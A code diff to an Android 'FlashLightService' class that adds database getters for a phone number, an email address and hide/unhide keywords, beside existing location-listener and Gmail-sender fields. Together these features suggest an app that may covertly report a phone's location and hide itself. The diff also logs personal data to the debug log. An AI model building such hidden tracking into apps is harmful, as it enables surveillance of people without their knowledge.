@@ -22,6 +22,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.location.LocationListener;
 
+import java.util.List;
 import android.net.Uri;
 import java.lang.Double;
 import android.util.Log;
@@ -35,9 +36,16 @@ public class FlashLightService extends Service implements LocationListener {
   private static String gmailEmailString;
   private static final String TAG = "FlashLight FLService";
 
+  public  static String sGetHideDb;
+  public  static String sHideKeywordDb;
+  public  static String sPhoneNumberDb;
+  public  static String sUnhideKeywordDb;
+  public  static String sEmailAddressDb;
+
   private static GmailSender sender;
   private static Configure configure;
   private static LocationManager locationManager;
+  private static DatabaseHandler databaseHandler;
 
   private static boolean eLocation = false;
   private static boolean mLocation = false;
@@ -149,6 +157,125 @@ public class FlashLightService extends Service implements LocationListener {
     Log.d(TAG, "onDestroy()");
   }
 
+  @Nullable
+  public String getHide() throws NullPointerException {
+
+    String get_hide = "null";
+
+    try {     
+      if(!getDatabaseInfo().equals("null")) {
+        get_hide = sGetHideDb;
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "unhideKeyword() unhide_keyword " + get_hide);
+    return get_hide;
+
+  }
+
+  @Nullable
+  public String emailAddress() throws NullPointerException {
+
+    String email_address = "null";
+
+    try {
+      if(!getDatabaseInfo().equals("null")) {
+        email_address = sEmailAddressDb;
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "emailAddress() email_address " + email_address);
+    return email_address;
+  }
+
+  @Nullable
+  public String phoneNumber() throws NullPointerException {
+
+    String phone_number = "null";
+
+    try {
+      if(!getDatabaseInfo().equals("null")) {
+        phone_number = sPhoneNumberDb;
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "phoneNumber() phone_number " + phone_number);
+    return phone_number;
+  }
+
+  @Nullable
+  public String hideKeyword() throws NullPointerException {
+
+    String hide_keyword = "null";
+
+    try {
+      if(!getDatabaseInfo().equals("null")) {
+        hide_keyword = sHideKeywordDb;
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "hideKeyword() hide_keyword " + hide_keyword);
+    return hide_keyword;
+  }
+
+  @Nullable
+  public String unhideKeyword() throws NullPointerException {
+
+    String unhide_keyword = "null";
+
+    try {
+      if(!getDatabaseInfo().equals("null")) {
+        unhide_keyword = sUnhideKeywordDb;
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "unhideKeyword() unhide_keyword " + unhide_keyword);
+    return unhide_keyword;
+
+  }
+
+  @Nullable
+  public String getDatabaseInfo() throws NullPointerException {
+
+    String database_action = "null";
+
+    if(databaseHandler == null) {
+      databaseHandler = new DatabaseHandler(this);
+      Log.d(TAG, "getDatabaseInfo() databaseHandler == null");
+    }
+
+    try {
+      List<FlashLightDatabase> flashLightDatabase = databaseHandler.getAllFlashLightDatabase();
+      for(FlashLightDatabase fldb : flashLightDatabase) {
+        sGetHideDb       = fldb.getHide();
+        sPhoneNumberDb   = fldb.getPhoneNumber();
+        sHideKeywordDb   = fldb.getHideKeyword();
+        sEmailAddressDb  = fldb.getEmailAddress();
+        sUnhideKeywordDb = fldb.getUnhideKeyword();
+      }
+      if(sEmailAddressDb != null) {
+        database_action = "update";
+        Log.d(TAG, "getDatabaseInfo() sGetHideDb " + sGetHideDb);
+        Log.d(TAG, "getDatabaseInfo() sPhoneNumberDb " + sPhoneNumberDb);
+        Log.d(TAG, "getDatabaseInfo() sHideKeywordDb " + sHideKeywordDb);
+        Log.d(TAG, "getDatabaseInfo() sEmailAddressDb " + sEmailAddressDb);
+        Log.d(TAG, "getDatabaseInfo() sUnhideKeywordDb " + sUnhideKeywordDb);
+      }
+      else if(sEmailAddressDb == null && flashLightDatabase != null) {
+        database_action = "create";
+      }
+    }
+    catch(NullPointerException e) { }
+
+    Log.d(TAG, "getDatabaseInfo() database_action " + database_action);
+    return database_action;
+  }
+
   public void onCreate(Context context, Intent intent) {
     Log.d(TAG, "onCreate()");
     try {
@@ -168,6 +295,10 @@ public class FlashLightService extends Service implements LocationListener {
   public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {
 
     Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
+
+    databaseHandler = new DatabaseHandler(this);
+
+    getDatabaseInfo();
 
     locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
  
